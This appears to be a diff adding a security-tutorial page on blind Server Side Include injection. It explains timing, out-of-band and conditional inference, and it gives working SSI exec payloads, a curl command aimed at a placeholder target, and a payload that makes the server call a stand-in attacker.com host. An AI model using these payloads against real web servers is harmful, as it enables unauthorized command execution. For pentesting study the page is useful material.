@@ -1,0 +1,101 @@
+---
+title: 'Blind SSI Injection: Exploit Techniques & Inference Methods'
+description: Explore blind SSI injection methods, leveraging timing, error states,
+  and out-of-band interactions to identify vulnerabilities.
+keywords:
+- Blind SSI Injection
+- time-based SSI
+- out-of-band SSI
+- command execution
+- information disclosure
+- inference-based SSI
+- conditional SSI
+- web server vulnerabilities
+- SSI directives
+---
+
+# Blind SSI Injection
+
+## Context
+
+Blind Server Side Include (SSI) Injection is a technique employed by offensive security professionals to exploit vulnerabilities within web applications. The unique challenge of blind SSI injection is that the attacker cannot directly observe the outcome of the injected payloads in the HTTP response. Instead, attackers leverage indirect effects such as time-based delays, out-of-band communications, or conditional logic to infer success. It is crucial to understand SSI directives and how web servers process these requests, along with the fundamentals of HTTP request and response cycles, to effectively execute blind SSI injections.
+
+## Theory
+
+### Nature of Blind SSI Injection
+
+Blind SSI injection occurs when an attacker successfully injects SSI directives within a vulnerable web application, but the output is suppressed or not directly visible in the HTTP response. Unlike typical SSI injections where the output is visibly returned to the user, blind injections require inference based on indirect indicators like timing or system-side effects.
+
+### Inference Channels in Blind SSI
+
+Successful exploitation of blind SSI vulnerabilities depends on inference channels. Timing attacks introduce measurable delays within the response, indicating successful execution. Error states or out-of-band effects, such as triggering an external HTTP request, can also provide confirmation of SSI code execution. The challenge is to recognize these indirect effects as evidence of a successful attack.
+
+### Blind SSI Exploitation Techniques
+
+- **Time-Based SSI:** This technique uses injected SSI directives that introduce a delay, such as `sleep`, to determine if the SSI executed based on an increase in response time.
+  
+- **Out-of-Band SSI:** External interactions are triggered (such as a request to an attacker-controlled server) to confirm execution. These interactions can be monitored to verify code execution.
+  
+- **Boolean/Conditional SSI:** Conditional logic within SSI is used to alter application behavior. Inferences are made by observing any change based on the condition’s outcome.
+
+### Attacker Mindset for Blind SSI
+
+Attackers must focus on the side effects of SSI execution rather than direct evidence. They craft payloads to exploit delays, logs, callbacks, or errors to confirm the presence and execution of SSI directives. The key is to design payloads that maximize the detectability of these indirect effects.
+
+## Practice
+
+### Time-Based Blind SSI Injection
+
+Time-based blind SSI injection involves injecting directives that cause a delay, allowing the attacker to observe the increase in response time as confirmation of successful execution.
+
+- **Payload:**
+
+    ```http
+    <!--#exec cmd="sleep 5"-->
+    ```
+
+- **Execution:**
+
+    ```bash
+    curl -w '%{time_total}\n' -X POST -d 'input=<!--#exec cmd="sleep 5"-->' http://target/path
+    ```
+
+  Measure the response time. A notable delay indicates successful SSI execution.
+
+### Out-of-Band Blind SSI Injection
+
+This technique uses SSI payloads that cause the server to make an outbound request. By monitoring the attacker's server for these requests, execution success is inferred.
+
+- **Payload:**
+
+    ```http
+    <!--#exec cmd="curl http://attacker.com/ssi_poc"-->
+    ```
+
+- **Steps:**
+
+    - Inject the payload in the vulnerable input field.
+    - Monitor your server logs at `attacker.com` for incoming requests. The presence of a request confirms execution.
+
+### Boolean/Conditional Blind SSI Injection
+
+Conditional SSI logic is used to infer execution by observing changes in behavior or output based on logical conditions evaluated within the server.
+
+- **Payload:**
+
+    ```http
+    <!--#if expr="1 = 2" -->FAIL<!--#endif--><!--#if expr="1 = 1" -->SUCCESS<!--#endif-->
+    ```
+
+- **Observation:**
+
+    Check for observable changes in the application behavior or logs that suggest conditional logic execution. Success is inferred through any difference in server processing.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
+- **tcpdump**
+- **netcat**
+
+By mastering these techniques, attackers can efficiently exploit blind SSI vulnerabilities in web applications, leveraging indirect cues and side effects to infer successful command execution or information disclosure.
